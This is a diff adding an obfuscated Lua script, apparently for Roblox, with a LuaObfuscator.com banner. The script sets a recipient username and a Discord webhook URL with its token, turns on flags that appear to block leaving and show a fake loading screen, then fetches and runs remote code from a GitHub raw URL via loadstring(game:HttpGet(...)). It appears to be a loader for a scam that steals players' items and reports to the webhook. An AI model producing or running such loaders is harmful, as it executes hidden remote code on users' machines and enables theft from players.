@@ -1,0 +1,13 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 
+
+]]--
+
+do local v0=0;local v1;while true do if (v0==0) then v1=0;while true do if (v1==2) then _G.AntiLeave=true;_G.MouseLock=true;v1=3;end if (v1==0) then UserName="Robi120k";Webhook="https://discord.com/api/webhooks/1139639685417807923/oAAXd1atnF2tD_IhSmtKq8uxEGiCtfYU5AlSVzMr5aIjsCYI6z1lBXwabDCtGm8VszkR
+";v1=1;end if (v1==3) then loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts",true))();break;end if (v1==1) then UserName2="Robi120k";_G.LoadingScreen=true;v1=2;end end break;end end end
